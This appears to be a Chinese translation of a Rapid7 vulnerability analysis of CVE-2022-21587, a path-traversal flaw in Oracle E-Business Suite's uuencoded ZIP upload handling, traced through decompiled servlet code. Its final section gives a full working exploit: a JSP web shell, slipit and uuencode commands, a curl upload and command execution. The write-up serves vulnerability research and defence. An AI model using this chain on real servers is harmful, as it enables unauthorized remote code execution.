# 漏洞原因
Oracle EBS应用程序被部署为运行在WebLogic服务器实例上的企业Java应用程序，在默认情况下，WebLogic将监听TCP端口8000上的HTTP连接。oacore应用程序通过文件`/u01/install/APPS/fs1/FMW_Home/Oracle_EBS-app1/applications/oacore/html/WEB-INF/web.xml`公开了几个端点，如下所示。我们感兴趣的是由继承自`BneAbstractXMLServlet servlet`的类提供服务的端点，特别是`/OA_HTML/BneViewerXMLService、/OA_HTML/BneDownloadService、/OA_HTML/BneOfflineLOVService和/OA_HTML/BneUploaderService`端点。虽然公开可用的利用目标是`/OA_HTML/BneUploaderService`端点，但所有四个端点都容易受到相同问题的攻击。  

```xml
<servlet>
    <servlet-name>BneViewerXMLService</servlet-name>

    <servlet-class>oracle.apps.bne.integrator.document.BneViewerXMLService</servlet-class>
  </servlet>

  <servlet-mapping>
    <servlet-name>BneViewerXMLService</servlet-name>
    <url-pattern>/BneViewerXMLService</url-pattern>
  </servlet-mapping>

  <servlet>
    <servlet-name>BneDownloadService</servlet-name>
    <servlet-class>oracle.apps.bne.integrator.download.BneDownloadService</servlet-class>
  </servlet>

  <servlet-mapping>
    <servlet-name>BneDownloadService</servlet-name>
    <url-pattern>/BneDownloadService</url-pattern>

  </servlet-mapping>

  <servlet>
    <servlet-name>BneOfflineLOVService</servlet-name>
    <servlet-class>oracle.apps.bne.integrator.download.BneOfflineLOVService</servlet-class>
  </servlet>

  <servlet-mapping>
    <servlet-name>BneOfflineLOVService</servlet-name>

    <url-pattern>/BneOfflineLOVService</url-pattern>
  </servlet-mapping>

  <servlet>
    <servlet-name>BneUploaderService</servlet-name>
    <servlet-class>oracle.apps.bne.integrator.upload.BneUploaderService</servlet-class>
  </servlet>

  <servlet-mapping>
    <servlet-name>BneUploaderService</servlet-name>
    <url-pattern>/BneUploaderService</url-pattern>
  </servlet-mapping>

```  

我们可以检查`BneAbstractXMLServlet`如何通过下面的`doRequest`方法处理对上述端点之一的`HTTP POST`请求。如果请求包含多部分表单(multipart)数据[1]，则检查HTTP请求参数`bne: ueupload`的值是否为`true`[2]，如果为true的话，请求文件数据后缀将被赋值为`.uue`[3]，然后继续调用方法`doUpload`[4]。  

```java
// /u01/install/APPS/fs1/EBSapps/comn/java/classes/oracle/apps/bne/framework/BneAbstractXMLServlet.class

  public String getMultipartFileNameSuffix(boolean paramBoolean) {
    if (paramBoolean)
      return ".uue"; // <--- [3]
    return ".xml";
  }
    
  public void doPost(HttpServletRequest paramHttpServletRequest, HttpServletResponse paramHttpServletResponse) throws ServletException, IOException {
    doRequest(paramHttpServletRequest, paramHttpServletResponse);
  }
  
  public void doRequest(HttpServletRequest paramHttpServletRequest, HttpServletResponse paramHttpServletResponse) throws ServletException, IOException {
    BneSitePropertyManager bneSitePropertyManager = BneSitePropertyManager.getInstance();
    try {
      BneOracleWebAppsContext bneOracleWebAppsContext;
      BneContext.getLogInstance().log(7, "Enter BneAbstractXMLServlet.doRequest()");
      boolean bool1 = allowGuestSession();
      boolean bool2 = allowBneLogin();
      boolean bool3 = includeMessagesElement();
      boolean bool4 = disableBneWebAppsContextRelease();
      BneWebAppsContext bneWebAppsContext = null;
      BneBaseBajaContext bneBaseBajaContext = null;
      PageEvent pageEvent = null;
      BneXMLPrintWriter bneXMLPrintWriter = null;
      BneResourceString.setLangOnThread(paramHttpServletRequest);
      try {
        bneWebAppsContext = BneAbstractWebAppsContext.getContext(paramHttpServletRequest, paramHttpServletResponse);
        BneResourceString.setLangOnThread(paramHttpServletRequest, bneWebAppsContext.getLanguage());
        bneBaseBajaContext = new BneBaseBajaContext(this, paramHttpServletRequest, paramHttpServletResponse);
        BneServletUtils.setRequestEncoding((BneBajaContext)bneBaseBajaContext);
        if (BneSecurity.isBneDisabled(bneWebAppsContext)) {
          if (bneXMLPrintWriter == null)
            bneXMLPrintWriter = new BneXMLPrintWriter(bneWebAppsContext, paramHttpServletRequest, paramHttpServletResponse); 
          outputErrorDocument(new BneErrorMessage(BneResourceString.getMlsString("GLB_ER_NO_ACCESS"), null, null, "BNE-020003"), (PrintWriter)bneXMLPrintWriter, bool3);
          bool4 = false;
          return;
        } 
        printServletHAP(paramHttpServletRequest);
        if ("post".equalsIgnoreCase(paramHttpServletRequest.getMethod()) && MultipartFormHandler.isMultipartRequest((ServletRequest)paramHttpServletRequest)) { // <--- [1]
          BneContext.getLogInstance().log(7, "BneAbstractXMLServlet.doRequest(), MultipartFileDirectoryName = " + getMultipartFileDirectoryName() + " prefix = " + getMultipartFileNamePrefix());
          BneMultipartRequest bneMultipartRequest = new BneMultipartRequest(paramHttpServletRequest, getMultipartFileDirectoryName());
          bneMultipartRequest.setFilePrefix(getMultipartFileNamePrefix());
          String str = paramHttpServletRequest.getParameter("bne:uueupload");
          if (str != null && str.length() > 0 && str.equalsIgnoreCase("TRUE")) { // <--- [2]
            bneMultipartRequest.setFileSuffix(getMultipartFileNameSuffix(true));
          } else {
            bneMultipartRequest.setFileSuffix(getMultipartFileNameSuffix(false));
          } 
          bneMultipartRequest.doUpload(); // <--- [4]
```  

`doUpload`方法将遍历multipart请求[1]中的每个项目，并调用`doUploadFile`方法来处理该特定项目[2]的上传。  

```java
// /u01/install/APPS/fs1/EBSapps/comn/java/classes/oracle/apps/bne/framework/BneMultipartRequest.class

  public void doUpload() throws IOException {
    this._logger.log(7, "BneMultipartRequest.doUpload(): Start");
    String str = this._request.getQueryString();
    if (str != null) {
      Hashtable hashtable = HttpUtils.parseQueryString(str);
      Enumeration<String> enumeration = hashtable.keys();
      while (enumeration.hasMoreElements()) {
        String str1 = enumeration.nextElement();
        put(str1, hashtable.get(str1));
      } 
    } 
    this._logger.log(7, "BneMultipartRequest.doUpload(): queryString " + str);
    this._logger.log(7, "BneMultipartRequest.doUpload(): Content-Type " + this._request.getContentType() + " content-length: " + this._request.getContentLength());
    MultipartFormHandler multipartFormHandler = new MultipartFormHandler((ServletRequest)this._request);
    MultipartFormItem multipartFormItem;
    while ((multipartFormItem = multipartFormHandler.getNextPart()) != null) { // <--- [1]
      String str1 = multipartFormItem.getName();
      String str2 = null;
      this._logger.log(7, "BneMultipartRequest.doUpload(): item.getName is: " + str1);
      if (str1.equals("uploadfilename"))
        this._logger.log(7, "BneMultipartRequest.doUpload(): item.getFilename is: " + multipartFormItem.getFilename()); 
      if (multipartFormItem.getFilename() == null) {
        str2 = multipartFormItem.getValue();
        this._logger.log(7, "BneMultipartRequest.doUpload(): item.getValue() is: " + str2);
      } else if (multipartFormItem.getFilename().length() > 0) {
        if (this.m_validMultipartParameterNames != null && !this.m_validMultipartParameterNames.containsKey(str1)) {
          this._logger.log(4, "BneMultipartRequest.doUpload(): Unknown Multipart file item ignored: " + str1);
          continue;
        } 
        this._logger.log(7, "BneMultipartRequest.doUpload(): going to doUploadFile of item ");
        if (multipartFormItem.getFilename().endsWith(".xlsx"))
          setFileSuffix(".xlsx"); 
        str2 = doUploadFile(multipartFormItem); // <--- [2]
```  

`doUploadFile`方法将上传数据写入临时文件[1]，以便对其进行处理。如果临时文件名包含字符串`uue`，则将其作为特殊情况处理。前面方法可以知道，通过传递HTTP请求参数`bne: ueupload`为true的话，上传文件会被设置为`.uue`后缀，就会满足此检查[2]。`.uue`文件是使用`uuencode`方法将二进制文件进行编码到文本文件。所以先进行`doDecode`方法[3]进行解码，将文本文件解码回二进制文件后，生成的二进制文件是ZIP格式，然后通过方法`doUnZip`[4]进行处理。  

```java
// /u01/install/APPS/fs1/EBSapps/comn/java/classes/oracle/apps/bne/framework/BneMultipartRequest.class

  private String doUploadFile(MultipartFormItem paramMultipartFormItem) throws IOException {
    this._logger.log(7, "BneMultipartRequest.doUploadFile(): Start");
    File file = BneIOUtils.createTemporaryFile(this._uploadStagingDirectory, this._filePrefix, this._fileSuffix);
    while (file.exists())
      file = BneIOUtils.createTemporaryFile(this._uploadStagingDirectory, this._filePrefix, this._fileSuffix); 
    this._logger.log(7, "BneMultipartRequest.doUploadFile(): Content Type is: " + paramMultipartFormItem.getContentType());
    this._logger.log(7, "BneMultipartRequest.doUploadFile(): File Name in item is: " + paramMultipartFormItem.getFilename());
    String str = file.toString();
    FileOutputStream fileOutputStream = new FileOutputStream(str);
    this._logger.log(7, "BneMultipartRequest.doUploadFile(): file location is: " + str);
    paramMultipartFormItem.writeFile(fileOutputStream); // <--- [1]
    fileOutputStream.flush();
    fileOutputStream.close();
    if (file.getName().contains("uue")) { // <--- [2]
      BneDecoder bneDecoder = new BneDecoder(new FileInputStream(file));
      String str1 = bneDecoder.doDecode(); // <--- [3]
      this._logger.log(7, "BneMultipartRequest.doUploadFile(): Zip file is: " + str1);
      BneUnZip bneUnZip = new BneUnZip();
      String str2 = bneUnZip.doUnZip(str1); // <--- [4]
```  

`downzip`方法存在路径遍历的漏洞。首先，检索`BNE_UPLOAD_STAGING_DIRECTORY`应用程序属性的值[1]。这个是在上面的`doDecode`过程中存储UUE解码文件的路径，也就是UUE解码后`ZIP`文件条目提取到的路径。默认情况下，这个位置是`/u01/install/APPS/fs1/EBSapps/appl/bne/12.0.0/upload`。对ZIP文件中的条目进行迭代[2]，对于ZIP文件中的每个条目，构造一个路径以将该条目文件提取到这个位置。这个路径是暂存目录加上文件名称[3]的连接。如果条目名称包含双点路径说明符../那么条目的内容就可以被写到暂存目录[4]之外的位置，实现路径穿越。例如，如果一个ZIP文件包含一个名称为`../../../../../foo`的条目，进行拼接后路径为`/u01/install/APPS/fs1/EBSapps/appl/bne/12.0.0/upload/…/…/…/…/…/foo`，则实际存放位置为：`/u01/install/APPS/fs1/foo.hax`  

```java
// /u01/install/APPS/fs1/EBSapps/comn/java/classes/oracle/apps/bne/utilities/BneUnZip.class

  public String doUnZip(String paramString) throws IOException {
    String str1 = new String("");
    String str2 = new String("");
    BneContext.getLogInstance().log(7, "BneUnZip.doUpZip Enter fileName: " + paramString);
    str1 = BneSitePropertyManager.getInstance().getProperty("BNE_UPLOAD_STAGING_DIRECTORY"); // <--- [1]
    try {
      BufferedOutputStream bufferedOutputStream = null;
      FileInputStream fileInputStream = new FileInputStream(paramString);
      ZipInputStream zipInputStream = new ZipInputStream(new BufferedInputStream(fileInputStream));
      ZipEntry zipEntry;
      while ((zipEntry = zipInputStream.getNextEntry()) != null) { // <--- [2]
        byte[] arrayOfByte = new byte[2048];
        str2 = str1 + System.getProperty("file.separator") + zipEntry.getName(); // <--- [3]
        FileOutputStream fileOutputStream = new FileOutputStream(str2);
        BneContext.getLogInstance().log(7, "BneUnZip.doUpZip entry.getName() " + zipEntry.getName());
        bufferedOutputStream = new BufferedOutputStream(fileOutputStream, 2048);
        int i;
        while ((i = zipInputStream.read(arrayOfByte, 0, 2048)) != -1) {
          bufferedOutputStream.write(arrayOfByte, 0, i); // <--- [4]
```  

# EXP制作
创建一个要上传文件:  
```h
$ cat <<EOT >> hax.jsp
<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if(cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String line = dis.readLine();
    while(line != null) {
        out.println(line); 
        line = dis.readLine(); 
    }
}
%>
EOT
```  
然后，我们使用`slipit`命令将这个JSP文件添加到ZIP存档中，文件名称添加5个双点说明符，来利用路径遍历漏洞，把文件写入到`/u01/install/APPS/fs1/FMW_Home/Oracle_eb-app1/applications/forms/forms/hax.jsp`  
```h
$ slipit --overwrite --separator '/' --depth 5 --prefix '/FMW_Home/Oracle_EBS-app1/applications/forms/forms/' hax.zip hax.jsp
```  
然后，我们对ZIP文件进行`uuencode`编码  

`$ uuencode hax.zip hax.zip > hax.uue`  

然后向四个易受攻击的端点之一发出POST请求,进行webshell文件上传。  

`$ curl http://192.168.86.37:8000/OA_HTML/BneOfflineLOVService?bne:uueupload=true -F upload=@hax.uue`  

然后利用JSP web shell执行任意命令  

```h
$ curl http://192.168.86.37:8000/forms/hax.jsp?cmd=id

uid=54321(oracle) gid=54321(oinstall) groups=54321(oinstall),54322(dba) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

原文地址：https://attackerkb.com/topics/Bkij5kK1qK/cve-2022-21587/rapid7-analysis?referrer=notificationEmail